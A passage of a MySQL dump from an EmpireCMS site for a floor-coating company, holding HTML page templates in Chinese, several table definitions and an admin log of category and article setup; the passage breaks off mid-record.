INSERT INTO `libang_enewsclasstemp` VALUES (1,'通用一级栏目模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n<title>[!--pagetitle--] - Powered by EmpireCMS</title>\r\n<meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n<meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n<link href=\\\"[!--news.url--]skin/default/css/style.css\\\" rel=\\\"stylesheet\\\" type=\\\"text/css\\\" />\r\n<script type=\\\"text/javascript\\\" src=\\\"[!--news.url--]skin/default/js/tabs.js\\\"></script>\r\n</head>\r\n<body class=\\\"channle\\\">\r\n[!--temp.header--]\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"10\\\" cellpadding=\\\"0\\\">\r\n<tr valign=\\\"top\\\">\r\n<td class=\\\"news_list\\\"><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"position\\\">\r\n<tr>\r\n<td>您当前的位置：[!--newsnav--]</td>\r\n</tr>\r\n</table>\r\n[listsonclass]\\\'selfinfo\\\',5,38,0,0,7,0,0[/listsonclass]</td>\r\n<td class=\\\"sider\\\"><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"title\\\">\r\n<tr>\r\n<td><strong>推荐资讯</strong></td>\r\n</tr>\r\n</table>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"8\\\" cellpadding=\\\"0\\\" class=\\\"box\\\">\r\n<tr>\r\n<td>[phomenewspic]\\\'selfinfo\\\',2,4,128,90,1,20,2[/phomenewspic]\r\n</td>\r\n</tr>\r\n</table>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"title margin_top\\\">\r\n<tr>\r\n<td><strong>最后更新</strong></td>\r\n</tr>\r\n</table>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"box\\\">\r\n<tr>\r\n<td><ul>\r\n[ecmsinfo]\\\'selfinfo\\\',10,44,0,0,2,0[/ecmsinfo] \r\n</ul></td>\r\n</tr>\r\n</table>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"title margin_top\\\">\r\n<tr>\r\n<td><strong>热门点击</strong></td>\r\n</tr>\r\n</table>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"box\\\">\r\n<tr>\r\n<td><ol class=\\\"rank\\\">\r\n[ecmsinfo]\\\'selfinfo\\\',10,40,0,1,10,0[/ecmsinfo] \r\n</ol></td>\r\n</tr>\r\n</table></td>\r\n</tr>\r\n</table>\r\n[!--temp.footer--]\r\n</body>\r\n</html>',0),(2,'分类信息一级栏目模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n<title>[!--pagetitle--] - Powered by EmpireCMS</title>\r\n<meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n<meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n<link href=\\\"[!--news.url--]skin/default/css/style.css\\\" rel=\\\"stylesheet\\\" type=\\\"text/css\\\" />\r\n<script type=\\\"text/javascript\\\" src=\\\"[!--news.url--]skin/default/js/tabs.js\\\"></script>\r\n</head>\r\n<body class=\\\"channle\\\">\r\n[!--temp.header--]\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"10\\\" cellpadding=\\\"0\\\">\r\n<tr valign=\\\"top\\\">\r\n<td class=\\\"news_list\\\"><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"position\\\">\r\n<tr>\r\n<td>您当前的位置：[!--newsnav--]</td>\r\n</tr>\r\n</table>\r\n[listsonclass]\\\'selfinfo\\\',5,38,0,0,7,0,0[/listsonclass]</td>\r\n<td class=\\\"sider\\\"><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"title\\\">\r\n<tr>\r\n<td><strong>分类信息搜索</strong></td>\r\n</tr>\r\n</table>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"box\\\">\r\n<tr>\r\n<td><form action=\\\"[!--news.url--]e/search/index.php\\\" method=\\\"post\\\" name=\\\"searchform\\\" id=\\\"searchform\\\">\r\n<table width=\\\"98%\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"0\\\" cellspacing=\\\"6\\\">\r\n<input type=\\\"hidden\\\" name=\\\"tbname\\\" value=\\\"info\\\">\r\n<input type=\\\"hidden\\\" name=\\\"tempid\\\" value=\\\"1\\\">\r\n<tr>\r\n<td><input name=\\\"keyboard\\\" type=\\\"text\\\" class=\\\"inputText\\\" id=\\\"keyboard\\\" size=\\\"18\\\" />\r\n<select name=\\\"show\\\">\r\n<option value=\\\"title,smalltext,myarea\\\" selected=\\\"selected\\\">不限</option>\r\n<option value=\\\"title\\\">信息标题</option>\r\n<option value=\\\"smalltext\\\">信息内容</option>\r\n<option value=\\\"myarea\\\">所在地</option>\r\n</select></td>\r\n</tr>\r\n<tr>\r\n<td><select name=\\\"classid\\\">\r\n<option value=\\\'9\\\'>所有分类</option>\r\n<option value=\\\'10\\\'>|-房屋信息</option>\r\n<option value=\\\'11\\\' >&nbsp;&nbsp;|-房屋求租</option>\r\n<option value=\\\'12\\\' >&nbsp;&nbsp;|-房屋出租</option>\r\n<option value=\\\'13\\\' >&nbsp;&nbsp;|-房屋求购</option>\r\n<option value=\\\'14\\\' >&nbsp;&nbsp;|-房屋出售</option>\r\n<option value=\\\'15\\\' >&nbsp;&nbsp;|-办公用房</option>\r\n<option value=\\\'16\\\' >&nbsp;&nbsp;|-旺铺门面</option>\r\n<option value=\\\'17\\\'>|-跳蚤市场</option>\r\n<option value=\\\'18\\\' >&nbsp;&nbsp;|-电脑配件</option>\r\n<option value=\\\'19\\\' >&nbsp;&nbsp;|-电器数码</option>\r\n<option value=\\\'20\\\' >&nbsp;&nbsp;|-通讯产品</option>\r\n<option value=\\\'21\\\' >&nbsp;&nbsp;|-居家用品</option>\r\n<option value=\\\'22\\\'>|-同城生活</option>\r\n<option value=\\\'23\\\' >&nbsp;&nbsp;|-本地新闻</option>\r\n<option value=\\\'24\\\' >&nbsp;&nbsp;|-购物打折</option>\r\n<option value=\\\'25\\\' >&nbsp;&nbsp;|-旅游活动</option>\r\n<option value=\\\'26\\\' >&nbsp;&nbsp;|-便民告示</option>\r\n<option value=\\\'27\\\'>|-求职招聘</option>\r\n<option value=\\\'28\\\' >&nbsp;&nbsp;|-工程技术</option>\r\n<option value=\\\'29\\\' >&nbsp;&nbsp;|-财务会计</option>\r\n<option value=\\\'30\\\' >&nbsp;&nbsp;|-餐饮行业</option>\r\n<option value=\\\'31\\\' >&nbsp;&nbsp;|-经营管理</option>\r\n</select>\r\n<input name=\\\"Submit2\\\" type=\\\"image\\\" value=\\\"搜索\\\" src=\\\"[!--news.url--]skin/default/images/search.gif\\\" />　\r\n[<a href=\\\"[!--news.url--]e/DoInfo/ChangeClass.php?mid=8\\\" target=\\\"_blank\\\">发布信息</a>]</td>\r\n</tr>\r\n</table>\r\n</form></td>\r\n</tr>\r\n</table>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"title\\\">\r\n<tr>\r\n<td><strong>地区导航</strong></td>\r\n</tr>\r\n</table>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"box\\\">\r\n<tr>\r\n<td>[!--temp.infoarea--]</td>\r\n</tr>\r\n</table>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"title margin_top\\\">\r\n<tr>\r\n<td><strong>分类导航</strong></td>\r\n</tr>\r\n</table>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"box\\\">\r\n<tr>\r\n<td>[!--temp.infoclassnav--]</td>\r\n</tr>\r\n</table>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"title margin_top\\\">\r\n<tr>\r\n<td><strong>热门点击</strong></td>\r\n</tr>\r\n</table>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"box\\\">\r\n<tr>\r\n<td><ol class=\\\"rank\\\">\r\n[ecmsinfo]\\\'selfinfo\\\',10,40,0,1,10,0[/ecmsinfo] \r\n</ol></td>\r\n</tr>\r\n</table></td>\r\n</tr>\r\n</table>\r\n[!--temp.footer--]\r\n</body>\r\n</html>',0);
/*!40000 ALTER TABLE `libang_enewsclasstemp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsclasstempclass`
--

DROP TABLE IF EXISTS `libang_enewsclasstempclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsclasstempclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` char(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsclasstempclass`
--

LOCK TABLES `libang_enewsclasstempclass` WRITE;
/*!40000 ALTER TABLE `libang_enewsclasstempclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsclasstempclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsdiggips`
--

DROP TABLE IF EXISTS `libang_enewsdiggips`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsdiggips` (
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `id` int(11) NOT NULL DEFAULT '0',
  `ips` mediumtext NOT NULL,
  KEY `classid` (`classid`,`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsdiggips`
--

LOCK TABLES `libang_enewsdiggips` WRITE;
/*!40000 ALTER TABLE `libang_enewsdiggips` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsdiggips` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsdo`
--

DROP TABLE IF EXISTS `libang_enewsdo`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsdo` (
  `doid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `doname` varchar(60) NOT NULL DEFAULT '',
  `dotime` smallint(6) NOT NULL DEFAULT '0',
  `isopen` tinyint(1) NOT NULL DEFAULT '0',
  `doing` tinyint(4) NOT NULL DEFAULT '0',
  `classid` text NOT NULL,
  `lasttime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`doid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsdo`
--

LOCK TABLES `libang_enewsdo` WRITE;
/*!40000 ALTER TABLE `libang_enewsdo` DISABLE KEYS */;
INSERT INTO `libang_enewsdo` VALUES (1,'自动刷新首页',12,0,0,',',1273215883);
/*!40000 ALTER TABLE `libang_enewsdo` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsdolog`
--

DROP TABLE IF EXISTS `libang_enewsdolog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsdolog` (
  `logid` bigint(20) NOT NULL AUTO_INCREMENT,
  `logip` varchar(20) NOT NULL DEFAULT '',
  `logtime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `username` varchar(30) NOT NULL DEFAULT '',
  `enews` varchar(30) NOT NULL DEFAULT '',
  `doing` varchar(255) NOT NULL DEFAULT '',
  `pubid` bigint(16) unsigned NOT NULL DEFAULT '0',
  `ipport` varchar(6) NOT NULL DEFAULT '',
  PRIMARY KEY (`logid`),
  KEY `pubid` (`pubid`)
) ENGINE=MyISAM AUTO_INCREMENT=1047 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsdolog`
--

LOCK TABLES `libang_enewsdolog` WRITE;
/*!40000 ALTER TABLE `libang_enewsdolog` DISABLE KEYS */;
INSERT INTO `libang_enewsdolog` VALUES (1,'127.0.0.1','2020-04-15 14:11:32','admin','login','---',0,'52086'),(2,'127.0.0.1','2020-04-15 14:13:46','admin','SetEnews','---',0,'52321'),(3,'127.0.0.1','2020-04-15 14:14:03','admin','DelTable','tid=2<br>tbname=download',0,'52330'),(4,'127.0.0.1','2020-04-15 14:14:10','admin','DelTable','tid=3<br>tbname=photo',0,'52335'),(5,'127.0.0.1','2020-04-15 14:14:14','admin','DelTable','tid=4<br>tbname=flash',0,'52335'),(6,'127.0.0.1','2020-04-15 14:14:19','admin','DelTable','tid=5<br>tbname=movie',0,'52335'),(7,'127.0.0.1','2020-04-15 14:14:24','admin','DelTable','tid=6<br>tbname=shop',0,'52335'),(8,'127.0.0.1','2020-04-15 14:14:55','admin','SetEnews','---',0,'52357'),(9,'127.0.0.1','2020-04-15 14:15:07','admin','EditListtemp','tempid=6<br>tempname=默认商城列表模板&amp;gid=1',0,'52366'),(10,'127.0.0.1','2020-04-15 14:15:11','admin','EditListtemp','tempid=5<br>tempname=默认电影列表模板&amp;gid=1',0,'52366'),(11,'127.0.0.1','2020-04-15 14:15:17','admin','EditListtemp','tempid=4<br>tempname=默认FLASH列表模板&amp;gid=1',0,'52366'),(12,'127.0.0.1','2020-04-15 14:15:21','admin','EditListtemp','tempid=3<br>tempname=默认图片列表模板&amp;gid=1',0,'52366'),(13,'127.0.0.1','2020-04-15 14:15:25','admin','EditListtemp','tempid=2<br>tempname=默认下载列表模板&amp;gid=1',0,'52366'),(14,'127.0.0.1','2020-04-15 14:15:37','admin','EditNewstemp','tempid=7<br>tempname=默认商城内容模板&amp;gid=1',0,'52388'),(15,'127.0.0.1','2020-04-15 14:15:41','admin','EditNewstemp','tempid=6<br>tempname=默认电影内容模板&amp;gid=1',0,'52388'),(16,'127.0.0.1','2020-04-15 14:15:45','admin','EditNewstemp','tempid=5<br>tempname=默认FLASH内容模板&amp;gid=1',0,'52388'),(17,'127.0.0.1','2020-04-15 14:15:48','admin','EditNewstemp','tempid=4<br>tempname=默认图片内容模板(图片集)&amp;gid=1',0,'52388'),(18,'127.0.0.1','2020-04-15 14:15:53','admin','EditNewstemp','tempid=3<br>tempname=默认图片内容模板(单图片)&amp;gid=1',0,'52388'),(19,'127.0.0.1','2020-04-15 14:15:56','admin','EditNewstemp','tempid=2<br>tempname=默认下载内容模板&amp;gid=1',0,'52388'),(20,'127.0.0.1','2020-04-15 14:17:33','admin','AddClass','classid=1<br>classname=产品中心',0,'52560'),(21,'127.0.0.1','2020-04-15 14:17:47','admin','EditListtemp','tempid=1<br>tempname=新闻列表模板&amp;gid=1',0,'52560'),(22,'127.0.0.1','2020-04-15 14:17:56','admin','EditListtemp','tempid=2<br>tempname=产品列表模板&amp;gid=1',0,'52585'),(23,'127.0.0.1','2020-04-15 14:18:03','admin','EditNewstemp','tempid=1<br>tempname=新闻内容模板&amp;gid=1',0,'52585'),(24,'127.0.0.1','2020-04-15 14:18:14','admin','EditNewstemp','tempid=2<br>tempname=产品内容模板&amp;gid=1',0,'52600'),(25,'127.0.0.1','2020-04-15 14:18:24','admin','EditNewstemp','tempid=3<br>tempname=通用单页&amp;gid=1',0,'52608'),(26,'127.0.0.1','2020-04-15 14:19:08','admin','EditClass','classid=1<br>classname=产品中心',0,'52634'),(27,'127.0.0.1','2020-04-15 14:19:45','admin','AddClass','classid=2<br>classname=关于我们',0,'52661'),(28,'127.0.0.1','2020-04-15 14:20:02','admin','AddClass','classid=3<br>classname=新闻资讯',0,'52679'),(29,'127.0.0.1','2020-04-15 14:20:17','admin','AddClass','classid=4<br>classname=工程案例',0,'52694'),(30,'127.0.0.1','2020-04-15 14:20:30','admin','AddClass','classid=5<br>classname=公司实力',0,'52711'),(31,'127.0.0.1','2020-04-15 14:20:56','admin','AddClass','classid=6<br>classname=联系我们',0,'52732'),(32,'127.0.0.1','2020-04-15 14:23:06','admin','AddClass','classid=7<br>classname=功能性地坪',0,'52845'),(33,'127.0.0.1','2020-04-15 14:23:32','admin','AddClass','classid=8<br>classname=环氧地坪',0,'52864'),(34,'127.0.0.1','2020-04-15 14:23:56','admin','AddClass','classid=9<br>classname=高端商业地坪',0,'52882'),(35,'127.0.0.1','2020-04-15 14:24:19','admin','AddClass','classid=10<br>classname=户外及运动场所',0,'52899'),(36,'127.0.0.1','2020-04-15 14:24:36','admin','AddClass','classid=11<br>classname=地坪材料',0,'52920'),(37,'127.0.0.1','2020-04-15 14:25:15','admin','AddClass','classid=12<br>classname=公司简介',0,'52950'),(38,'127.0.0.1','2020-04-15 14:25:44','admin','AddClass','classid=13<br>classname=企业文化',0,'52972'),(39,'127.0.0.1','2020-04-15 14:26:12','admin','AddClass','classid=14<br>classname=公司风采',0,'52993'),(40,'127.0.0.1','2020-04-15 14:26:52','admin','AddClass','classid=15<br>classname=企业资讯',0,'53023'),(41,'127.0.0.1','2020-04-15 14:27:15','admin','AddClass','classid=16<br>classname=行业动态',0,'53041'),(42,'127.0.0.1','2020-04-15 14:27:42','admin','AddClass','classid=17<br>classname=常见问题',0,'53064'),(43,'127.0.0.1','2020-04-15 14:29:42','admin','AddClass','classid=18<br>classname=最新案例',0,'53134'),(44,'127.0.0.1','2020-04-15 14:30:11','admin','AddClass','classid=19<br>classname=经典案例',0,'53154'),(45,'127.0.0.1','2020-04-15 14:30:25','admin','ChangeClassIslast','classid=18<br>classname=最新案例',0,'53166'),(46,'127.0.0.1','2020-04-15 14:30:35','admin','EditClass','classid=18<br>classname=最新案例',0,'53166'),(47,'127.0.0.1','2020-04-15 14:31:24','admin','AddClass','classid=20<br>classname=荣誉资质',0,'53204'),(48,'127.0.0.1','2020-04-15 14:31:49','admin','AddClass','classid=21<br>classname=合作伙伴',0,'53224'),(49,'127.0.0.1','2020-04-15 14:32:00','admin','EditClass','classid=1<br>classname=产品中心',0,'53224'),(50,'127.0.0.1','2020-04-15 14:32:39','admin','EditClass','classid=4<br>classname=工程案例',0,'53257'),(51,'127.0.0.1','2020-04-15 14:33:35','admin','AddNews','classid=12<br>id=1<br>title=公司简介',1000010000000001,'53368'),(52,'127.0.0.1','2020-04-15 14:33:51','admin','EditNews','classid=12<br>id=1<br>title=公司简介',1000010000000001,'53386'),(53,'127.0.0.1','2020-04-15 14:34:15','admin','AddNews','classid=20<br>id=2<br>title=荣誉资质',1000010000000002,'53406'),(54,'127.0.0.1','2020-04-15 14:34:32','admin','AddNews','classid=21<br>id=3<br>title=合作伙伴',1000010000000003,'53420'),(55,'127.0.0.1','2020-04-15 14:34:49','admin','AddNews','classid=6<br>id=4<br>title=联系我们',1000010000000004,'53434'),(56,'127.0.0.1','2020-04-15 15:05:57','admin','SetMoreClass','---',0,'54549'),(57,'127.0.0.1','2020-04-15 15:06:28','admin','SetEnews','---',0,'54570'),(58,'127.0.0.1','2020-04-15 15:11:30','admin','AddNews','classid=7<br>id=5<br>title=彩色混凝土密封固化剂地坪',1000010000000005,'54745'),(59,'127.0.0.1','2020-04-15 15:13:49','admin','AddNews','classid=7<br>id=6<br>title=金刚砂耐磨地坪',1000010000000006,'54838'),(60,'127.0.0.1','2020-04-15 15:14:03','admin','EditNews','classid=7<br>id=5<br>title=彩色混凝土密封固化剂地坪',1000010000000005,'54850'),(61,'127.0.0.1','2020-04-15 15:14:34','admin','AddNews','classid=7<br>id=7<br>title=超平混泥土地坪',1000010000000007,'54881'),(62,'127.0.0.1','2020-04-15 15:15:10','admin','AddNews','classid=7<br>id=8<br>title=卷材片材类地板',1000010000000008,'54909'),(63,'127.0.0.1','2020-04-15 15:15:39','admin','AddNews','classid=7<br>id=9<br>title=纳米硅地坪',1000010000000009,'54920'),(64,'127.0.0.1','2020-04-15 15:16:06','admin','AddNews','classid=7<br>id=10<br>title=不发火防静电耐磨地坪',1000010000000010,'54960'),(65,'127.0.0.1','2020-04-15 15:16:56','admin','AddNews','classid=7<br>id=11<br>title=聚氨酯砂浆自流平地坪',1000010000000011,'54997'),(66,'127.0.0.1','2020-04-15 15:17:21','admin','AddNews','classid=7<br>id=12<br>title=聚氨酯自流平地坪',1000010000000012,'55021'),(67,'127.0.0.1','2020-04-15 15:21:16','admin','AddNews','classid=7<br>id=13<br>title=聚氨酯耐磨地坪',1000010000000013,'55192'),(68,'127.0.0.1','2020-04-15 15:21:57','admin','AddNews','classid=7<br>id=14<br>title=乙烯基酯重防腐地坪',1000010000000014,'55225'),(69,'127.0.0.1','2020-04-15 15:22:21','admin','AddNews','classid=7<br>id=15<br>title=聚脲防水防腐地坪',1000010000000015,'55249'),(70,'127.0.0.1','2020-04-15 15:24:13','admin','AddNews','classid=8<br>id=16<br>title=环氧微珠耐磨地坪',1000010000000016,'55329'),(71,'127.0.0.1','2020-04-15 15:24:38','admin','AddNews','classid=8<br>id=17<br>title=水性环氧地坪',1000010000000017,'55355'),(72,'127.0.0.1','2020-04-15 15:25:08','admin','AddNews','classid=8<br>id=18<br>title=环氧防静电地坪',1000010000000018,'55377'),(73,'127.0.0.1','2020-04-15 15:25:49','admin','AddNews','classid=8<br>id=19<br>title=环氧自流平地坪',1000010000000019,'55421'),(74,'127.0.0.1','2020-04-15 15:26:16','admin','AddNews','classid=8<br>id=20<br>title=环氧砂浆平涂地坪',1000010000000020,'55436'),(75,'127.0.0.1','2020-04-15 15:28:43','admin','AddNews','classid=9<br>id=21<br>title=3D艺术地坪',1000010000000021,'55606'),(76,'127.0.0.1','2020-04-15 15:29:12','admin','AddNews','classid=9<br>id=22<br>title=艺术泼墨地坪',1000010000000022,'55626'),(77,'127.0.0.1','2020-04-15 15:29:51','admin','AddNews','classid=9<br>id=23<br>title=无机磨石',1000010000000023,'55655'),(78,'127.0.0.1','2020-04-15 15:30:14','admin','AddNews','classid=9<br>id=24<br>title=水泥自流平磨石地坪',1000010000000024,'55695'),(79,'127.0.0.1','2020-04-15 15:30:43','admin','AddNews','classid=9<br>id=25<br>title=复古地坪',1000010000000025,'55722'),(80,'127.0.0.1','2020-04-15 15:31:28','admin','AddNews','classid=9<br>id=26<br>title=彩色水泥自流平地坪',1000010000000026,'55748'),(81,'127.0.0.1','2020-04-15 15:34:04','admin','AddNews','classid=9<br>id=27<br>title=环氧磨石地坪',1000010000000027,'55934'),(82,'127.0.0.1','2020-04-15 15:34:37','admin','AddNews','classid=9<br>id=28<br>title=环氧彩砂地坪',1000010000000028,'55973'),(83,'127.0.0.1','2020-04-15 16:37:06','admin','login','---',0,'56768'),(84,'127.0.0.1','2020-04-15 16:37:52','admin','AddNews','classid=10<br>id=29<br>title=改性环氧彩色防滑路面',1000010000000029,'56911'),(85,'127.0.0.1','2020-04-15 16:38:18','admin','AddNews','classid=10<br>id=30<br>title=悬浮拼装地板',1000010000000030,'56953'),(86,'127.0.0.1','2020-04-15 16:38:36','admin','AddNews','classid=10<br>id=31<br>title=人造草坪',1000010000000031,'56974'),(87,'127.0.0.1','2020-04-15 16:39:00','admin','AddNews','classid=10<br>id=32<br>title=塑胶跑道地坪',1000010000000032,'57002'),(88,'127.0.0.1','2020-04-15 16:39:24','admin','AddNews','classid=10<br>id=33<br>title=硅PU运动场地坪',1000010000000033,'57035'),(89,'127.0.0.1','2020-04-15 16:39:50','admin','AddNews','classid=10<br>id=34<br>title=丙烯酸运动场地坪',1000010000000034,'57056'),(90,'127.0.0.1','2020-04-15 16:40:10','admin','AddNews','classid=10<br>id=35<br>title=透水地坪',1000010000000035,'57089'),(91,'127.0.0.1','2020-04-15 16:41:32','admin','AddNews','classid=11<br>id=36<br>title=水性环氧涂料',1000010000000036,'57154'),(92,'127.0.0.1','2020-04-15 16:42:15','admin','TDelFile_all','---',0,'57195'),(93,'127.0.0.1','2020-04-15 16:42:33','admin','AddNews','classid=11<br>id=37<br>title=环氧自流平面漆',1000010000000037,'57205'),(94,'127.0.0.1','2020-04-15 16:42:56','admin','AddNews','classid=11<br>id=38<br>title=环氧磨石涂料',1000010000000038,'57237'),(95,'127.0.0.1','2020-04-15 16:43:26','admin','AddNews','classid=11<br>id=39<br>title=环氧防静电涂料',1000010000000039,'57269'),(96,'127.0.0.1','2020-04-15 16:44:06','admin','AddNews','classid=11<br>id=40<br>title=环氧中涂',1000010000000040,'57306'),(97,'127.0.0.1','2020-04-15 16:44:30','admin','AddNews','classid=11<br>id=41<br>title=环氧平涂面漆',1000010000000041,'57330'),(98,'127.0.0.1','2020-04-15 16:44:57','admin','AddNews','classid=11<br>id=42<br>title=环氧底涂',1000010000000042,'57345'),(99,'127.0.0.1','2020-04-15 16:49:40','admin','AddNews','classid=18<br>id=43<br>title=昌平科兴车间自流平',1000010000000043,'57507'),(100,'127.0.0.1','2020-04-15 16:50:00','admin','EditNews','classid=18<br>id=43<br>title=昌平科兴车间自流平',1000010000000043,'57521'),(101,'127.0.0.1','2020-04-15 16:50:30','admin','AddNews','classid=18<br>id=44<br>title=昌平乐多港环氧磨石',1000010000000044,'57549'),(102,'127.0.0.1','2020-04-15 16:50:53','admin','AddNews','classid=18<br>id=45<br>title=怀来瑞士公馆车库坡道',1000010000000045,'57569'),(103,'127.0.0.1','2020-04-15 16:51:19','admin','AddNews','classid=18<br>id=46<br>title=百度云计算中心自流平',1000010000000046,'57593'),(104,'127.0.0.1','2020-04-15 16:51:44','admin','AddNews','classid=18<br>id=47<br>title=北京奥体南区4号地车库自流平',1000010000000047,'57613'),(105,'127.0.0.1','2020-04-15 16:52:05','admin','AddNews','classid=18<br>id=48<br>title=北京奔驰车间固化地坪',1000010000000048,'57636'),(106,'127.0.0.1','2020-04-15 16:52:24','admin','AddNews','classid=18<br>id=49<br>title=北京康尔福药厂车间自流平',1000010000000049,'57656'),(107,'127.0.0.1','2020-04-15 16:52:41','admin','AddNews','classid=18<br>id=50<br>title=北京三九制药车间自流平',1000010000000050,'57672'),(108,'127.0.0.1','2020-04-15 16:53:04','admin','AddNews','classid=18<br>id=51<br>title=北京网易大厦水泥自流平磨石',1000010000000051,'57691'),(109,'127.0.0.1','2020-04-15 16:53:20','admin','AddNews','classid=18<br>id=52<br>title=北京小飞机控股EPDM',1000010000000052,'57691'),(110,'127.0.0.1','2020-04-15 16:53:38','admin','AddNews','classid=18<br>id=53<br>title=昌平东升联创静电平涂',1000010000000053,'57727'),(111,'127.0.0.1','2020-04-15 16:54:45','admin','AddNews','classid=15<br>id=54<br>title=地坪行业一项重大突破',1000010000000054,'57840'),(112,'127.0.0.1','2020-04-15 16:55:22','admin','AddNews','classid=15<br>id=55<br>title=现代工业对地坪漆的要求越来越严格',1000010000000055,'57864'),(113,'127.0.0.1','2020-04-15 16:55:55','admin','AddNews','classid=15<br>id=56<br>title=防静电地坪漆渗透剂具备极好的黏着力',1000010000000056,'57895'),(114,'127.0.0.1','2020-04-15 16:56:15','admin','AddNews','classid=15<br>id=57<br>title=停车场地坪漆复合材料的到来',1000010000000057,'57913'),(115,'127.0.0.1','2020-04-15 16:56:38','admin','AddNews','classid=15<br>id=58<br>title=地坪工程定义和按材料分类',1000010000000058,'57929'),(116,'127.0.0.1','2020-04-15 16:57:10','admin','AddNews','classid=15<br>id=59<br>title=关于地坪涂料的环保性能和毒性测试',1000010000000059,'57960'),(117,'127.0.0.1','2020-04-15 16:57:39','admin','AddNews','classid=15<br>id=60<br>title=工业地坪设计与基础要求及处理',1000010000000060,'57999'),(118,'127.0.0.1','2020-04-15 16:57:59','admin','AddNews','classid=15<br>id=61<br>title=地坪的服务范围',1000010000000061,'58017'),(119,'127.0.0.1','2020-04-15 16:58:27','admin','AddNews','classid=15<br>id=62<br>title=如何选择地坪？',1000010000000062,'58037'),(120,'127.0.0.1','2020-04-15 16:58:44','admin','AddNews','classid=15<br>id=63<br>title=地坪的用途',1000010000000063,'58053'),(121,'127.0.0.1','2020-04-15 17:02:57','admin','EditNews','classid=15<br>id=63<br>title=地坪的用途',1000010000000063,'58209'),(122,'127.0.0.1','2020-04-15 17:03:12','admin','EditNews','classid=15<br>id=62<br>title=如何选择地坪？',1000010000000062,'58209'),(123,'127.0.0.1','2020-04-15 